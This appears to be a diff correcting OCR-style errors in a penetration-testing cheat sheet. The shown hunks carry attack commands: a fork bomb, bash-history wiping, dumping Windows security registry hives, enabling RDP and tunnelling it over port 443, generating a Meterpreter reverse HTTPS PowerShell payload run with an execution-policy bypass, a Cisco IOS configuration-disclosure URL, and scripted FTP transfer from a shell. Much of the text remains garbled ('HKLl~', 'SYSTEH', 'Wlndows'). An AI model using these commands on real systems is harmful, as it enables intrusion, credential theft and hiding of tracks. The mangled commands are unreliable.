@@ -70,7 +70,7 @@ ln /dev/null -/.bash_historj -sf
 # Fork Bomb
 
 ```
-: (){:I: &I;:
+:(){:I: &I;:
 ```
 
 # TCPDump
@@ -100,7 +100,7 @@ reg save HKLl~\Security security.hive echo %USERNAl~E%
 
 ```
 reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-(Tunnel RDP through port 443) REG ADD "HKLt1\System\CurrentControlSet\Control\Terminal
+(Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
 Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
 ```
 
@@ -116,10 +116,10 @@ powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subjec
 
 # PowerShell Launching Meterpreter Payload
 
-1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.psl
-2. Move audit.psl into same folder as encodeMeterpreter.psl
+1. msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.ps1
+2. Move audit.ps1 into same folder as encodeMeterpreter.ps1
 3. Launch Powershell (x86)
-4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl
+4. powershell.exe -executionpolicy bypass encodeMeterpreter.ps1
 5. Copy the encoded Meterpreter string
 
 # Windows User Lockout
@@ -155,7 +155,7 @@ Solaris : 255
 # Cisco IOS 11.2 - 12.2 Vulnerability
 
 ```
-http:// ip /level/ 16-99 /exec/show/config
+http://ip/level/16-99/exec/show/config
 ```
 
 # FTP Through Non-Interactive Shell
@@ -165,7 +165,7 @@ echo open ip 21 ftp.txt
 echo user
 echo pass
 echo bin
-echo GET file =tp.txt echo bfe ftp.txt
+echo GET file=tp.txt echo bfe ftp.txt
 ftp -s:ftp.txt
 ```
 
